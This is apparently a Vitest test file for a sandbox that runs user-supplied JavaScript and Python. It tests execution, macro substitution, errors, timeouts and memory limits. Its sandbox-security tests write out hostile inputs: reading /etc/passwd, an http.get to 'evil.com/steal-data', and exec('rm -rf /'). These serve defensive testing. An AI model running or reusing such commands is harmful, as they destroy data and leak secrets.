import { describe, it, expect } from 'vitest';

/**
 * Script Execution Tests
 *
 * Tests JavaScript/Python script execution with sandbox security
 */

describe('JavaScript Script Execution', () => {
    describe('Basic Execution', () => {
        it('should execute simple JavaScript', async () => {
            const script = `
                const x = 5;
                const y = 10;
                return x + y;
            `;

            const result = await executeScript(script, 'javascript');

            expect(result.value).toBe(15);
        });

        it('should capture console.log output', async () => {
            const script = `
                console.log('Hello');
                console.log('World');
                return 'done';
            `;

            const result = await executeScript(script, 'javascript');

            expect(result.logs).toEqual(['Hello', 'World']);
            expect(result.value).toBe('done');
        });

        it('should handle return value', async () => {
            const script = 'return {status: "success", count: 42};';

            const result = await executeScript(script, 'javascript');

            expect(result.value).toEqual({ status: 'success', count: 42 });
        });
    });

    describe('Macro Integration', () => {
        it('should resolve {{prev}} in script', async () => {
            const previousTaskResult = 'Previous result';

            const script = `
                const input = "{{prev}}";
                return input.toUpperCase();
            `;

            // After macro resolution:
            const resolvedScript = `
                const input = "Previous result";
                return input.toUpperCase();
            `;

            const result = await executeScript(resolvedScript, 'javascript');

            expect(result.value).toBe('PREVIOUS RESULT');
        });

        it('should handle multiline prev data', async () => {
            const csvData = 'A,B,C\\n1,2,3\\n4,5,6';

            const script = `
                const csv = "{{prev}}";
                const lines = csv.split('\\\\n');
                return lines.length;
            `;

            // Expected: Newlines properly escaped
        });
    });

    describe('Sandbox Security', () => {
        it('should prevent filesystem access', async () => {
            const script = `
                const fs = require('fs');
                fs.readFileSync('/etc/passwd');
            `;

            // Expected: Security error, operation blocked
        });

        it('should prevent network access', async () => {
            const script = `
                const http = require('http');
                http.get('http://evil.com/steal-data');
            `;

            // Expected: Blocked
        });

        it('should prevent process access', async () => {
            const script = `
                const { exec } = require('child_process');
                exec('rm -rf /');
            `;

            // Expected: Blocked
        });

        it('should allow safe modules', async () => {
            const script = `
                const _ = require('lodash');
                return _.chunk([1,2,3,4], 2);
            `;

            // Expected: Safe modules allowed (if whitelisted)
        });
    });

    describe('Error Handling', () => {
        it('should catch syntax errors', async () => {
            const script = 'const x = ;'; // Invalid syntax

            const result = await executeScript(script, 'javascript');

            expect(result.error).toBeDefined();
            expect(result.error).toContain('Unexpected token');
        });

        it('should catch runtime errors', async () => {
            const script = `
                const obj = null;
                return obj.property; // Cannot read property of null
            `;

            const result = await executeScript(script, 'javascript');

            expect(result.error).toBeDefined();
        });

        it('should provide error stack trace', async () => {
            const script = `
                function fail() {
                    throw new Error('Test error');
                }
                fail();
            `;

            const result = await executeScript(script, 'javascript');

            expect(result.error).toContain('Test error');
            expect(result.stack).toBeDefined();
        });
    });

    describe('Timeout Handling', () => {
        it('should timeout infinite loops', async () => {
            const script = `
                while(true) {
                    // Infinite loop
                }
            `;

            const result = await executeScript(script, 'javascript', { timeout: 1000 });

            expect(result.error).toContain('timeout');
        });

        it('should respect custom timeout', async () => {
            const script = `
                const start = Date.now();
                while(Date.now() - start < 5000) {
                    // Wait 5 seconds
                }
                return 'done';
            `;

            // With 10s timeout: should complete
            const result1 = await executeScript(script, 'javascript', { timeout: 10000 });
            expect(result1.value).toBe('done');

            // With 1s timeout: should timeout
            const result2 = await executeScript(script, 'javascript', { timeout: 1000 });
            expect(result2.error).toContain('timeout');
        });
    });

    describe('Memory Management', () => {
        it('should limit memory usage', async () => {
            const script = `
                const bigArray = new Array(1000000000); // 1 billion elements
                bigArray.fill(0);
                return 'done';
            `;

            // Expected: Memory limit error or timeout
        });
    });

    describe('Async Operations', () => {
        it('should handle async/await', async () => {
            const script = `
                async function wait() {
                    return new Promise(resolve => {
                        setTimeout(() => resolve('done'), 100);
                    });
                }
                return await wait();
            `;

            const result = await executeScript(script, 'javascript');

            expect(result.value).toBe('done');
        });

        it('should handle Promise chains', async () => {
            const script = `
                return Promise.resolve(5)
                    .then(x => x * 2)
                    .then(x => x + 3);
            `;

            const result = await executeScript(script, 'javascript');

            expect(result.value).toBe(13);
        });
    });
});

describe('Python Script Execution', () => {
    it('should execute Python script', async () => {
        const script = `
x = 5
y = 10
return x + y
        `;

        const result = await executeScript(script, 'python');

        expect(result.value).toBe(15);
    });

    it('should capture print statements', async () => {
        const script = `
print('Hello')
print('Python')
return 'done'
        `;

        const result = await executeScript(script, 'python');

        expect(result.logs).toEqual(['Hello', 'Python']);
    });

    it('should handle Python libraries', async () => {
        const script = `
import json
data = {"key": "value"}
return json.dumps(data)
        `;

        const result = await executeScript(script, 'python');

        expect(result.value).toBe('{"key": "value"}');
    });
});

describe('Script context - Available Variables', () => {
    it('should provide macro data in context', async () => {
        const macroData = {
            prev: 'Previous result',
            project: {
                name: 'Test Project',
            },
        };

        const script = `
            console.log(prev); // From macro data
            console.log(project.name);
            return 'done';
        `;

        // Expected: Variables available in script scope
    });
});
